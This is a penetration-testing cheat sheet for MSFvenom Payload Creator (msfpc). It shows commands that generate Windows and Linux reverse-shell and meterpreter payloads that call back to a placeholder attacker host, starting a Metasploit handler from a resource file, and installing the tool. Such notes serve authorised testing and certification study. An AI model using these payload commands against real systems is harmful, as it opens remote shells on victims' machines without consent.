# MSFvenom payload creator

## Examples

### Drop cmd windows

A classic reverse shell payload (generating a payload with a `cmd` as the preferred shell for
Windows, setting the LHOST to the IP retrieved from the eth0 Ethernet interface of the Kali machine):

    $ msfpc cmd windows eth0
    
Two files are created, an executable payload by name of `windows-shell-staged-reverse-tcp-443.exe`, and a 
resource file named `windows-shell-staged-reverse-tcp-443-exe.rc`, useful for automating repetitive tasks in 
Metasploit. Resource scripts can chain series of Metasploit console commands and directly embed Ruby to do 
things such as call APIs, interact with objects in the database, and iterate actions.

### Drop msf windows

    $ msfpc msf windows eth0

The payload is now set to a `windows/meterpreter/reverse_tcp`. 
The associated resource file can be executed with:

    msfconsole -q -r 'windows-meterpreter-staged-reverse-tcp-443-exe.rc'

When the payload is executed, the stager will request for other parts of the payload to be
sent over to the target server. These parts of the payload will be sent by payload handler
and the complete staged payload is delivered to the victim machine.

### Meterpreter

A staged meterpreter reverse shell for a 64bit Linux target:

    msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=<IP address attack machine> LPORT=<port-number>

## Notes

    $ msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>)
    (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>)
    (<VERBOSE>)

* TYPE is the `-f` switch in msfvenom
* DOMAIN/IP is the LHOST option
* PORT is the LPORT option
* CMD/MSF is the type of shell dropped once the payload is executed on the target system.
* BATCH/LOOP to generate multiple payloads (multiple OS platforms) with a single command.

### Meterpreter

Meterpreter shells are completely stable, making them a very good thing when working with Windows targets. They 
also have a lot of inbuilt functionality, such as file uploads and downloads. If we want to use any of Metasploit's 
post-exploitation tools then we need to use a meterpreter shell.

The downside to meterpreter shells is that they must be caught in Metasploit. They are also banned from certain 
certification examinations, so it is a good idea to learn alternative methodologies just for that.

## Tools

MSFvenom Payload Creator is preinstalled in Kali. On other *nix, to install it:

    git clone https://github.com/g0tmi1k/mpc

Set execute permission on the `msfpc.sh` file:

    cd mpc/
    chmod +x msfpc.sh

Start her up with:

    ./msfpc.sh